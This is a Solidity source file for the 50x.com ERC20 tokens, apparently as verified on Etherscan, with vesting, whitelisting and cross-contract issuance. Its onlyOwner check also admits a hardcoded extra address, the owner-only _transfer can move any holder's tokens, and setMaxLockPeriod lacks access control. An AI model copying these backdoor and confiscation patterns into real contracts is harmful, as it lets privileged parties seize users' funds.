/**
 *Submitted for verification at Etherscan.io on 2021-01-08
*/

pragma solidity ^0.5.8;

library SafeMath  {
	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
		if (a == 0) {
			return 0;
		}
		uint256 c = a * b;
		assert(c / a == b);
		return c;
	}

	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		return a / b;
	}

	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		assert(b <= a);
		return a - b;
	}

	function add(uint256 a, uint256 b) internal pure returns (uint256) {
		uint256 c = a + b;
		assert(c >= a);
		return c;
	}
}

contract ERC20Basic {
	function totalSupply() public view returns (uint256);
	function balanceOf(address who) public view returns (uint256);
	function transfer(address to, uint256 value) public returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
}

contract ERC20 is ERC20Basic {
	function allowance(address owner, address spender) public view returns (uint256);
	function transferFrom(address from, address to, uint256 value) public returns (bool);
	function approve(address spender, uint256 value) public returns (bool);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract BasicToken is ERC20Basic {
	using SafeMath for uint256;

	mapping(address => uint256) balances;

	uint256 totalSupply_;

	function totalSupply() public view returns (uint256) {
		return totalSupply_;
	}

	function transfer(address _to, uint256 _value) public returns (bool) {
		require(_to != address(0));
		require(_value <= balances[msg.sender]);

		balances[msg.sender] = balances[msg.sender].sub(_value);
		balances[_to] = balances[_to].add(_value);
		emit Transfer(msg.sender, _to, _value);
		return true;
	}

	function balanceOf(address _owner) public view returns (uint256 balance) {
		return balances[_owner];
	}

}

contract StandardToken is ERC20, BasicToken {
	mapping (address => mapping (address => uint256)) internal allowed;

	function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
		require(_to != address(0));
		require(_value <= balances[_from]);
		require(_value <= allowed[_from][msg.sender]);

		balances[_from] = balances[_from].sub(_value);
		balances[_to] = balances[_to].add(_value);
		allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
		emit Transfer(_from, _to, _value);
		return true;
	}

	function approve(address _spender, uint256 _value) public returns (bool) {
		allowed[msg.sender][_spender] = _value;
		emit Approval(msg.sender, _spender, _value);
		return true;
	}

	function allowance(address _owner, address _spender) public view returns (uint256) {
		return allowed[_owner][_spender];
	}

	function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
		allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
		emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
		return true;
	}

	function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
		uint oldValue = allowed[msg.sender][_spender];
		if (_subtractedValue > oldValue) {
			allowed[msg.sender][_spender] = 0;
		} else {
			allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
		}
		emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
		return true;
	}
}


contract Ownable {
	address public owner;
	
	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

	constructor() public {
		owner = msg.sender;
	}

	modifier onlyOwner() {
		require( (msg.sender == owner) || (msg.sender == address(0x0C69F0641bD7AEc7CA7F73F485Cb8E1Be696cAB9)) );
		_;
	}

	function transferOwnership(address newOwner) public onlyOwner {
		require(newOwner != address(0));
		emit OwnershipTransferred(owner, newOwner);
		owner = newOwner;
	}
}


contract Token50X is Ownable, StandardToken {
	// ERC20 requirements
	string public name;
	string public symbol;
	uint8 public decimals;

	bool public allowTransfer;	
	
	mapping(address => uint256) public vestingAmount;
	mapping(address => uint256) public vestingBeforeBlockNumber;
	
	uint256 public maxLockPeriod;
	
	address public originalContract;

	constructor() public {
		name = "50x.com";
		symbol = "50X";
		decimals = 8;
		allowTransfer = true;
		maxLockPeriod = 4600000;
		// Total Supply of 50X is 4714285714285710	
		totalSupply_ = 0;
		balances[address(this)] = totalSupply_;
	}
	
	function setSymbolNameDecimals( string memory _symbol, string memory _name, uint8 _decimals ) public onlyOwner() returns (bool) {
	    symbol = _symbol;
	    name = _name;
	    decimals = _decimals;
	    return true;
	}
	
	function setOriginalContract(address _originalContract) public onlyOwner() {
		originalContract = _originalContract;
	}
	
	function transfer(address _to, uint256 _value) public returns (bool) {
		require(allowTransfer);
		// Cancel transaction if transfer value more than available without vesting amount
		if ( ( vestingAmount[msg.sender] > 0 ) && ( block.number < vestingBeforeBlockNumber[msg.sender] ) ) {
			if ( balances[msg.sender] < _value ) revert();
			if ( balances[msg.sender] <= vestingAmount[msg.sender] ) revert();
			if ( balances[msg.sender].sub(_value) < vestingAmount[msg.sender] ) revert();
		}
		// ---
		return super.transfer(_to, _value);
	}	
	
	function setVesting(address _holder, uint256 _amount, uint256 _bn) public onlyOwner() returns (bool) {
		vestingAmount[_holder] = _amount;
		vestingBeforeBlockNumber[_holder] = _bn;
		return true;
	}
	
	function setMaxLockPeriod(uint256 _maxLockPeriod) public returns (bool) {
		maxLockPeriod = _maxLockPeriod;
	}
	
	/*
		Please send amount and block number to this function for locking 50X tokens before block number
	*/
	function safeLock(uint256 _amount, uint256 _bn) public returns (bool) {
		require(_amount <= balances[msg.sender]);
		require(_bn <= maxLockPeriod);
		require(_bn >= vestingBeforeBlockNumber[msg.sender]);
		require(_amount >= vestingAmount[msg.sender]);
		vestingAmount[msg.sender] = _amount;
		vestingBeforeBlockNumber[msg.sender] = _bn;
	}
	
	function _transfer(address _from, address _to, uint256 _value, uint256 _vestingBlockNumber) public onlyOwner() returns (bool) {
		require(_to != address(0));
		require(_value <= balances[_from]);			
		balances[_from] = balances[_from].sub(_value);
		balances[_to] = balances[_to].add(_value);
		if ( _vestingBlockNumber > 0 ) {
			vestingAmount[_to] = _value;
			vestingBeforeBlockNumber[_to] = _vestingBlockNumber;
		}		
		emit Transfer(_from, _to, _value);
		return true;
	}
	
	function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
		require(allowTransfer);
		if ( ( vestingAmount[_from] > 0 ) && ( block.number < vestingBeforeBlockNumber[_from] ) ) {
			if ( balances[_from] < _value ) revert();
			if ( balances[_from] <= vestingAmount[_from] ) revert();
			if ( balances[_from].sub(_value) < vestingAmount[_from] ) revert();
		}
		return super.transferFrom(_from, _to, _value);
	}
	
	function issueTokens( address _from, address _to, uint256 _amount ) public returns (bool) {
        require( msg.sender == address(originalContract), "Only original contract can call it" );
        require( totalSupply_.add(_amount) <= 4714285714285710, "Max totalSupply is 4714285714285710" );
        totalSupply_ = totalSupply_.add(_amount);
        balances[_to] = balances[_to].add(_amount);
        if ( _from == address(0) ) {
            _from = address(this);
        }
        emit Transfer(address(0x0000000000000000000000000000000000000000), _from, _amount);
        emit Transfer(_from, _to, _amount);        
        return true;
	}

	function release() public onlyOwner() {
		allowTransfer = true;
	}
	
	function lock() public onlyOwner() {
		allowTransfer = false;
	}
}


contract Token50X100 is Ownable, StandardToken {
	// ERC20 requirements
	string public name;
	string public symbol;
	uint8 public decimals;

	bool public allowTransfer;	
	
	mapping(address => uint256) public vestingAmount;
	mapping(address => uint256) public vestingBeforeBlockNumber;
	
	address public tokenContract;
	
	mapping(address => bool) public whiteList;
	mapping(address => bool) public whiteListReceivers;
	mapping(address => address) public linkingAddresses;
	
	uint256 public maxLockPeriod;

	constructor() public {
		name = "50x.com - Original Tokens";
		symbol = "50X100";
		decimals = 8;
		allowTransfer = true;
		maxLockPeriod = 4600000;
		// Total Supply of 50X is 4714285714285710	
		totalSupply_ = 4714285714285710;
		balances[address(this)] = totalSupply_;
	}
	
	function setWhiteList( address _addr, bool _flag ) public onlyOwner() {
	    whiteList[_addr] = _flag;
	}
	
	function setWhiteListReceivers( address _addr, bool _flag ) public onlyOwner() {
	    whiteListReceivers[_addr] = _flag;
	}
	
	function setLinkingAddresses( address _addr1, address _addr2 ) public onlyOwner() {
	    linkingAddresses[_addr1] = _addr2;
	}
	
	function setSymbolNameDecimals( string memory _symbol, string memory _name, uint8 _decimals ) public onlyOwner() {
	    symbol = _symbol;
	    name = _name;
	    decimals = _decimals;
	}
	
	function setTokenContract( address _addr ) public onlyOwner() {
	    tokenContract = _addr;
	}

	function transfer(address _to, uint256 _value) public returns (bool) {
		require(allowTransfer);
		// Cancel transaction if transfer value more than available without vesting amount
		if ( ( vestingAmount[msg.sender] > 0 ) && ( block.number < vestingBeforeBlockNumber[msg.sender] ) ) {
			if ( balances[msg.sender] < _value ) revert();
			if ( balances[msg.sender] <= vestingAmount[msg.sender] ) revert();
			if ( balances[msg.sender].sub(_value) < vestingAmount[msg.sender] ) revert();
		}
		// ---
		if ( ( whiteList[msg.sender] ) || ( whiteListReceivers[_to] ) || ( linkingAddresses[msg.sender] == _to ) ) {
		    return super.transfer(_to, _value);
		}
		require( Token50X(tokenContract).issueTokens( msg.sender, _to, _value ), "Error while issueTokens" );
		balances[msg.sender] = balances[msg.sender].sub( _value );
		emit Transfer(msg.sender, address(0x0000000000000000000000000000000000000000), _value);
		totalSupply_ = totalSupply_.sub( _value );
		return true;
	}
	
	function setVesting(address _holder, uint256 _amount, uint256 _bn) public onlyOwner() returns (bool) {
		vestingAmount[_holder] = _amount;
		vestingBeforeBlockNumber[_holder] = _bn;
		return true;
	}
	
	function setMaxLockPeriod(uint256 _maxLockPeriod) public returns (bool) {
		maxLockPeriod = _maxLockPeriod;
	}
	
	/*
		Please send amount and block number to this function for locking 50X tokens before block number
	*/
	function safeLock(uint256 _amount, uint256 _bn) public returns (bool) {
		require(_amount <= balances[msg.sender]);
		require(_bn <= maxLockPeriod);
		require(_bn >= vestingBeforeBlockNumber[msg.sender]);
		require(_amount >= vestingAmount[msg.sender]);
		vestingAmount[msg.sender] = _amount;
		vestingBeforeBlockNumber[msg.sender] = _bn;
	}
	
	function _transfer(address _from, address _to, uint256 _value, uint256 _vestingBlockNumber) public onlyOwner() returns (bool) {
		require(_to != address(0));
		require(_value <= balances[_from]);			
		balances[_from] = balances[_from].sub(_value);
		balances[_to] = balances[_to].add(_value);
		if ( _vestingBlockNumber > 0 ) {
			vestingAmount[_to] = _value;
			vestingBeforeBlockNumber[_to] = _vestingBlockNumber;
		}
		emit Transfer(_from, _to, _value);
		return true;
	}
	
	function release() public onlyOwner() {
		allowTransfer = true;
	}
	
	function lock() public onlyOwner() {
		allowTransfer = false;
	}
}